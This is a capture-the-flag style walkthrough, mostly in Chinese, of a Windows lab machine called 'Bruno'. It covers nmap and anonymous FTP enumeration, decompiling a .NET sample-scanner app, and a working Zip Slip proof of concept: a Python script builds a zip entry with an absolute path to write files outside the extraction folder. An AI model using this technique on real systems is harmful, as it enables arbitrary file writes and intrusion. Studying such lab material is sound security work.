## Bruno
```
//用 Microsoft .NET 运行时 去启动一个 .NET 程序
C:\Users\11xiaohei\Downloads\changelog>dotnet SampleScanner.exe
```
```
[★]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.6.204 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
[★]$ nmap -p$ports -sC -sV 10.129.6.204
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-13 03:07 CDT
Nmap scan report for brunodc.bruno.vl (10.129.6.204)
Host is up (0.30s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-29-22  04:55PM       <DIR>          app
| 06-29-22  04:33PM       <DIR>          benign
| 06-29-22  01:41PM       <DIR>          malicious
|_06-29-22  04:33PM       <DIR>          queue
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-13 08:07:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
|_ssl-date: 2026-03-13T08:09:02+00:00; 0s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=bruno-BRUNODC-CA
| Not valid before: 2022-06-29T13:23:01
|_Not valid after:  2121-06-29T13:33:00
|_http-title: IIS Windows Server
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
|_ssl-date: 2026-03-13T08:09:02+00:00; +1s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2026-03-13T08:09:02+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2026-03-13T08:09:02+00:00; +1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BRUNO
|   NetBIOS_Domain_Name: BRUNO
|   NetBIOS_Computer_Name: BRUNODC
|   DNS_Domain_Name: bruno.vl
|   DNS_Computer_Name: brunodc.bruno.vl
|   DNS_Tree_Name: bruno.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-13T08:08:22+00:00
| ssl-cert: Subject: commonName=brunodc.bruno.vl
| Not valid before: 2026-03-12T07:54:56
|_Not valid after:  2026-09-11T07:54:56
|_ssl-date: 2026-03-13T08:09:02+00:00; +1s from scanner time.
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
54566/tcp open  msrpc         Microsoft Windows RPC
54571/tcp open  msrpc         Microsoft Windows RPC
54707/tcp open  msrpc         Microsoft Windows RPC
57617/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57618/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BRUNODC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-03-13T08:08:26
|_  start_date: N/A
```
```
[★]$ echo '10.129.6.204 brunodc.bruno.vl bruno.vl' | sudo tee -a /etc/hosts
10.129.6.204 brunodc.bruno.vl bruno.vl
```
#### FTP 
```
[★]$ ftp bruno.vl
Connected to brunodc.bruno.vl.
220 Microsoft FTP Service
Name (bruno.vl:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||55040|)
125 Data connection already open; Transfer starting.
06-29-22  04:55PM       <DIR>          app
06-29-22  04:33PM       <DIR>          benign
06-29-22  01:41PM       <DIR>          malicious
06-29-22  04:33PM       <DIR>          queue
226 Transfer complete.
ftp> cd app
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||55050|)
150 Opening ASCII mode data connection.
06-29-22  05:42PM                  165 changelog
06-28-22  07:15PM                  431 SampleScanner.deps.json
06-29-22  03:58PM                 7168 SampleScanner.dll
06-29-22  03:58PM               174592 SampleScanner.exe
06-28-22  07:15PM                  170 SampleScanner.runtimeconfig.dev.json
06-28-22  07:15PM                  154 SampleScanner.runtimeconfig.json
226 Transfer complete.

ftp> cd benign
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||55056|)
150 Opening ASCII mode data connection.
06-29-22  04:32PM                    4 test.exe
226 Transfer complete.

ftp> cd malicious
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||55101|)
125 Data connection already open; Transfer starting.
226 Transfer complete.

ftp> cd queue
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||55123|)
150 Opening ASCII mode data connection.
226 Transfer complete.
```
#### malicious恶意文件夹和queue队列似乎为空。良性文件夹中仅有一个名为 test.exe 的文件。之后
#### 下载下来后，我们可以看到它并非可执行文件，而是一个包含字符串“123\n”的 ASCII 文本文件。
```
[★]$ file test.exe
test.exe: ASCII text
[★]$ cat test.exe
123
```
#### 这让我们把目光转向“应用”文件夹，它也是包含文件最多的文件夹。
### 分析 SampleScanner .NET 应用程序
```
[★]$ file changelog
changelog: ASCII text
[★]$ cat changelog
Version 0.3
- integrated with dev site
- automation using svc_scan

Version 0.2
- additional functionality 

Version 0.1
- initial support for EICAR string
```
#### 它并未提供有关该应用程序的性质和功能的太多信息。然而，“使用 svc_scan 的自动化”这一条提示我们存在一个可能用于通过此应用程序进行自动化操作的账户。
#### 从 SampleScanner.deps.json 文件中，我们可以获取到该可执行文件所使用的 .NET 版本，即 3.1 。我们还能看到它加载了 SampleScanner.dll 组件。
```
[★]$ file SampleScanner.deps.json
SampleScanner.deps.json: JSON text data
[★]$ cat  SampleScanner.deps.json
{
  "runtimeTarget": {
    "name": ".NETCoreApp,Version=v3.1",
    "signature": ""
  },
  "compilationOptions": {},
  "targets": {
    ".NETCoreApp,Version=v3.1": {
      "SampleScanner/1.0.0": {
        "runtime": {
          "SampleScanner.dll": {}
        }
      }
    }
  },
  "libraries": {
    "SampleScanner/1.0.0": {
      "type": "project",
      "serviceable": false,
      "sha512": ""
    }
  }
}
```
#### 从 SampleScanner.runtimeconfig.dev.json 文件中，我们可以获取到一个用户名--xct 。
```
[★]$ file SampleScanner.runtimeconfig.dev.json
SampleScanner.runtimeconfig.dev.json: JSON text data
[★]$ cat  SampleScanner.runtimeconfig.dev.json
{
  "runtimeOptions": {
    "additionalProbingPaths": [
      "C:\\Users\\xct\\.dotnet\\store\\|arch|\\|tfm|",
      "C:\\Users\\xct\\.nuget\\packages"
    ]
  }
}
```
#### 由于我们知道.NET 程序集会被编译成中间语言，所以我们将使用“文件”命令来确认我们获取的可执行文件和.dll 文件中哪些是.NET 程序集。
```
[★]$ file SampleScanner.dll
SampleScanner.dll: MS-DOS executable
[★]$ file SampleScanner.exe
SampleScanner.exe: MS-DOS executable
```
#### 该 dll 实际上是一个 .Net 程序集，因此我们可以使用像 dnspy 这样的工具来解编这个程序集并获取其库的源代码。而另一个可执行文件则是以原生 x64 机器代码编译的，这意味着我们不得不采用静态和动态分析的方式来理解其工作流程。不过，这种情况可能并非总是需要的——该可执行文件很可能只是 dll 的加载器，其中将包含工作流程的主要功能。
#### 可以通过https://file.io进行隔空传送
### 注：.exe 或 .dll在windows不能单一运行，需要目录完整和二进制文件传输完整！！！
```
tp> binary
200 Type set to I.
ftp> !mkdir app
ftp> lcd app
Local directory now: /home/syareya55/app
ftp> cd app
250 CWD command successful.
ftp> mget *
mget changelog [anpqy?]? 
```
```
[★]$ tar -czvf app.tar.gz app
```
#### 二进制文件被破坏传输是不能如期执行.\SampleScanner.exe’命令的
```
PS C:\samples\app> .\SampleScanner.exe
You must install or update .NET to run this application.

App: C:\samples\app\SampleScanner.exe
Architecture: x64
Framework: 'Microsoft.NETCore.App', version '3.1.0' (x64)
.NET location: C:\Program Files\dotnet\x64\

The following frameworks were found:
  8.0.25 at [C:\Program Files\dotnet\x64\shared\Microsoft.NETCore.App]
  9.0.14 at [C:\Program Files\dotnet\x64\shared\Microsoft.NETCore.App]

Learn more:
https://aka.ms/dotnet/app-launch-failed

To install missing framework, download:
https://aka.ms/dotnet-core-applaunch?framework=Microsoft.NETCore.App&framework_version=3.1.0&arch=x64&rid=win-x64&os=win10
```


----------------------------
```
C:\Users\11xiaohei\Downloads\changelog>dir
 
 C:\Users\11xiaohei\Downloads\changelog 的目录

2026/03/13  17:18    <DIR>          .
2026/03/13  17:18    <DIR>          ..
2026/03/13  17:10               156 changelog
2026/03/13  17:10               409 SampleScanner.deps.json
2026/03/13  17:10             7,154 SampleScanner.dll
2026/03/13  17:10           174,536 SampleScanner.exe
2026/03/13  17:10               163 SampleScanner.runtimeconfig.dev.json
2026/03/13  17:10               146 SampleScanner.runtimeconfig.json
2026/03/13  17:10                 4 test.exe
               7 个文件        182,568 字节
               2 个目录 199,994,527,744 可用字节
```
```
C:\Users\11xiaohei\Downloads\changelog>dotnet SampleScanner.dll
You must install or update .NET to run this application.

App: C:\Users\11xiaohei\Downloads\changelog\SampleScanner.dll
Architecture: arm64
Framework: 'Microsoft.NETCore.App', version '3.1.0' (arm64)
.NET location: C:\Program Files\dotnet\

The following frameworks were found:
  8.0.19 at [C:\Program Files\dotnet\shared\Microsoft.NETCore.App]
  9.0.8 at [C:\Program Files\dotnet\shared\Microsoft.NETCore.App]

Learn more:
https://aka.ms/dotnet/app-launch-failed

To install missing framework, download:
https://aka.ms/dotnet-core-applaunch?framework=Microsoft.NETCore.App&framework_version=3.1.0&arch=arm64&rid=win-arm64&os=win10
```
#### 用 Microsoft .NET 运行时 去启动一个 .NET 程序。
#### SampleScanner.exe 不是传统的 Windows 原生程序，而是 .NET Core 编译出来的应用，所以需要 .NET runtime 才能运行
```
C:\Users\11xiaohei\Downloads\changelog>echo %PROCESSOR_ARCHITECTURE%
ARM64

//直接用 安装脚本，可惜了这里安装的是我环境ARM64的dotnet,不是靶机需要的x64的dotnet
PS C:\Users\11xiaohei> Invoke-WebRequest https://dot.net/v1/dotnet-install.ps1 -OutFile dotnet-install.ps1
PS C:\Users\11xiaohei> Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
PS C:\Users\11xiaohei> .\dotnet-install.ps1 -Runtime dotnet -Version 3.1.32 -Architecture arm64

PS C:\Users\11xiaohei> dotnet --list-runtimes
Microsoft.AspNetCore.App 8.0.19 [C:\Program Files\dotnet\shared\Microsoft.AspNetCore.App]
Microsoft.AspNetCore.App 9.0.8 [C:\Program Files\dotnet\shared\Microsoft.AspNetCore.App]
Microsoft.NETCore.App 3.1.32 [C:\Users\11xiaohei\AppData\Local\Microsoft\dotnet\shared\Microsoft.NETCore.App]
```

#### 下载Microsoft.NETCore.App&framework_version=3.1.0之后，如果我们使用工具“进程监视器Process Monitor”，并仅筛选出显示与“进程名称为 SampleScanner.exe”相匹配的结果，例如这样：
https://learn.microsoft.com/en-us/sysinternals/downloads/procmon 
#### 解压之后运行Procmon.exe
#### 选择 ‘process Name' is 'SampleScanner.exe' then 'Include'

#### 考 .NET 程序分析能力，而不是让你实际运行；
#### 现在我们可以对 SampleScanner.dll 进行反编译，并查看源代码以找出任何我们能够利用的潜在漏洞
#### dnSpy | ILSpy
https://github.com/icsharpcode/ILSpy
```
// This file does not contain a managed assembly.

System.BadImageFormatException: Invalid PE signature.
   at ICSharpCode.ILSpyX.LoadedAssembly.LoadAsync(Task`1 streamTask) in /_/ICSharpCode.ILSpyX/LoadedAssembly.cs:line 387
   at ICSharpCode.ILSpy.TreeNodes.AssemblyTreeNode.Decompile(Language language, ITextOutput output, DecompilationOptions options)

PS C:\Users\11xiaohei> Get-Content C:\Users\11xiaohei\Downloads\changelog\SampleScanner.dll -Encoding Byte -TotalCount 2
77
90

//编译打不开的话，就换另一种编译或者重新下载新的.dll ,再不济就往下走
```
#### 安装了dotpeek终于打开了
https://www.jetbrains.com/decompiler/
```
// Decompiled with JetBrains decompiler
// Type: SampleScanner.Program
// Assembly: SampleScanner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F802DA52-4179-4C52-B977-743340BF1853
// Assembly location: C:\samples\app\SampleScanner.dll

using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;

#nullable disable
namespace SampleScanner;

internal class Program
{
  public static IEnumerable<int> PatternAt(byte[] source, byte[] pattern)
  {
    for (int i = 0; i < source.Length; ++i)
    {
      if (((IEnumerable<byte>) source).Skip<byte>(i).Take<byte>(pattern.Length).SequenceEqual<byte>((IEnumerable<byte>) pattern))
        yield return i;
    }
  }

  private static void Main(string[] args)
  {
    string str = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EYCAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
    str.Replace("EYCAR", "EICAR");
    byte[] bytes = Encoding.ASCII.GetBytes(str);
    foreach (string file in Directory.GetFiles("C:\\samples\\queue\\", "*", SearchOption.AllDirectories))
    {
      if (file.EndsWith(".zip"))
      {
        using (ZipArchive zipArchive = ZipFile.OpenRead(file))
        {
          foreach (ZipArchiveEntry entry in zipArchive.Entries)
          {
            string destinationFileName = Path.Combine("C:\\samples\\queue\\", entry.FullName);
            entry.ExtractToFile(destinationFileName);
          }
          File.Delete(file);
        }
      }
      else if (Program.PatternAt(File.ReadAllBytes(file), bytes).Any<int>())
      {
        File.Copy(file, file.Replace("queue", "malicious"), true);
        File.Delete(file);
      }
      else
      {
        File.Copy(file, file.Replace("queue", "benign"), true);
        File.Delete(file);
      }
    }
  }
}
```

#### 我们可以看到，该可执行文件确实加载了 SampleScanner.dll 文件。
________
#### 首先生成一个包含 EICAR 测试文件字符串的字节数组，然后该库会继续从 C:\samples\queue 目录中检索文件。接下来，它会遍历检索到的文件名，如果这些文件以.zip 扩展名结尾，则将归档文件的内容提取到 C:\samples\queue 目录下，然后删除原始文件（即归档文件）。最后，对于从归档文件中提取出来的每个文件，它会将其与 EICAR 测试字符串进行比较。如果EICAR 模式存在于所获取文件的字节表示形式中，这会将该文件移动至恶意文件区域。文件夹。如果不是这样，它就会将该文件移动到“良性”文件夹中。
https://en.wikipedia.org/wiki/EICAR_test_file
```
EICAR 测试字符串[ 9 ]读作[ 10 ]

X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
第三个字符是拉丁字母大写字母“O” ，而不是数字零
```
#### 由于研究这段代码中漏洞的唯一可行选项是 ZipArchive 类，我们将在网上搜索 C# 中的 ZipArchive 漏洞。
https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm
#### 防止 .NET 中的 Zip 滑移,文件路径可以是任意的
#### 在搜索结果中，我们可以找到这篇文章，它解释了使用 Path.Combine 将文件提取到文件而不是使用 ExtractToDirectory 是危险的。本质上，Path.Combine 将各个字符串连接成一个表示文件路径的单个字符串。但是，正如微软文档中所述，如果除第一个参数外的任何参数包含根路径，则任何先前的路径组件都将被忽略。这意味着，如果压缩文件中的文件包含像 C:\Users\rogue\any.txt 这样的路径，那么与压缩文件名组合的 C:\samples\queue 路径将被忽略，文件将被提取到 C:\Users\rogue\any.txt  
#### 关于 .NET 9 的 Path.Combine方法
https://learn.microsoft.com/en-us/dotnet/api/system.io.path.combine?view=net-9.0
```
C#

合并(ReadOnlySpan<String>)
将一段字符串合并成一个路径。
public static string Combine(scoped ReadOnlySpan<string> paths);

合并(字符串[])
将字符串数组组合成一个路径。
public static string Combine(params string[] paths);

以下示例将字符串数组组合成一个路径
string[] paths = {@"d:\archives", "2001", "media", "images"};
string fullPath = Path.Combine(paths);
Console.WriteLine(fullPath);
```
#### 这种情况之所以危险，是因为我们实际上可以创建一个包含根路径的文件名，并将其归档。当 Path 创建路径组合的字符串时，归档文件的内容将写入归档文件名中包含的路径，从而允许我们在系统上写入任意文件。我们可以在本地机器上测试这一点。首先，我们需要创建一个文件名包含路径的文件。我们可以使用 Python 来实现。首先，我们将为测试目的创建一个测试文件：
```
[★]$ echo 'this is a test file' > test.txt
```
#### 我们将使用以下自定义脚本创建一个包含测试文件的压缩文件，同时将该文件名修改为 C:\Users\rogue\Desktop\test.txt 。
```
[★]$ cat file_path.py
import zipfile

source = r"test.txt"
zip_name = r"test.zip"

with zipfile.ZipFile(zip_name,"w", zipfile.ZIP_DEFLATED) as zf:
    zf.write(source, arcname=r"C:\Users\rogue\Desktop\test.txt")
```
#### 如果我们运行此脚本，然后解压我们创建的存档文件，就可以看到文件名确实是 C:\Users\rogue\Desktop\test.txt 。
```
[★]$ python3 file_path.py
[★]$ unzip test.zip
Archive:  test.zip
  inflating: C:\Users\rogue\Desktop\test.txt
[★]$ ls -la 'C:\Users\rogue\Desktop\test.txt'
-rw-r--r-- 1 syareya55 syareya55 20 Mar 15 02:02 'C:\Users\rogue\Desktop\test.txt'
```
#### 现在，我们将把我们的存档移动到本地 Windows 测试实例中的 C:\samples\queue 文件夹，SampleScanner.dll 就是期望在那里找到存档的。
#### 现在，如果我们运行“SampleScanner.exe”程序，就会发现文件“test.txt”将会被创建在指定的路径中。
